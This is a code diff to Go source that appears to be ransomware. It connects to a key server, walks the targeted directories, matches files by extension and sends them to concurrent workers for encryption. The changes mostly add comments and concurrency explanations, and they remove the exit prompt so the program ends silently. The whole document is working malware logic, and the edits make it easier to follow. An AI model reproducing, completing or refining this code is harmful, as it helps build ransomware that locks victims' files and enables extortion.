@@ -37,17 +37,12 @@ func main() {
 	cmd.CheckOS()
 
 	encryptFiles()
-
-	// Wait for enter to exit
-	var s string
-	fmt.Println("Press enter to quit")
-	fmt.Scanf("%s", &s)
 }
 
 func encryptFiles() {
 	keys := make(map[string]string)
 	start := time.Now()
-	// Loop creating new keys if server return an validation error
+	// Loop creating new keys if server return a validation error
 	for {
 		// Check for timeout
 		if duration := time.Since(start); duration.Seconds() >= SecondsToTimeout {
@@ -98,12 +93,17 @@ func encryptFiles() {
 
 	log.Println("Walking interesting dirs and indexing files...")
 
+	// Setup a waitgroup so we can wait for all goroutines to finish
 	var wg sync.WaitGroup
 
 	wg.Add(1)
-	// Loop over the interesting directories
+
+	// Indexing files in concurrently thread
 	go func() {
+		// Decrease the wg count after finish this goroutine
 		defer wg.Done()
+
+		// Loop over the interesting directories
 		for _, f := range cmd.InterestingDirs {
 			folder := cmd.BaseDir + f
 			filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
@@ -112,7 +112,13 @@ func encryptFiles() {
 					// Matching extensions
 					if utils.StringInSlice(ext[1:], cmd.InterestingExtensions) {
 						file := cmd.File{FileInfo: f, Extension: ext[1:], Path: path}
+
+						// Each file is processed by a free worker on the pool, so, for each file
+						// we need wait for the goroutine to finish
 						wg.Add(1)
+
+						// Send the file to the MatchedFiles channel then workers
+						// can imediatelly proccess then
 						cmd.MatchedFiles <- file
 						log.Println("Matched:", path)
 					}
@@ -120,16 +126,19 @@ func encryptFiles() {
 				return nil
 			})
 		}
+
+		// Close the MatchedFiles channel after all files have been indexed and send to then
 		close(cmd.MatchedFiles)
 	}()
 
-	// Process file that are sended to channel
-	// Launch NumWorker for handle files
+	// Process files that are sended to the channel
+	// Launch NumWorker workers for handle the files concurrently
 	for i := 0; i < cmd.NumWorkers; i++ {
 		go func() {
 			for {
 				select {
 				case file, ok := <-cmd.MatchedFiles:
+					// Check if has nothing to receive from the channel
 					if !ok {
 						return
 					}
@@ -168,6 +177,7 @@ func encryptFiles() {
 		}()
 	}
 
+	// Wait for all goroutines to finish
 	wg.Wait()
 
 	message := `
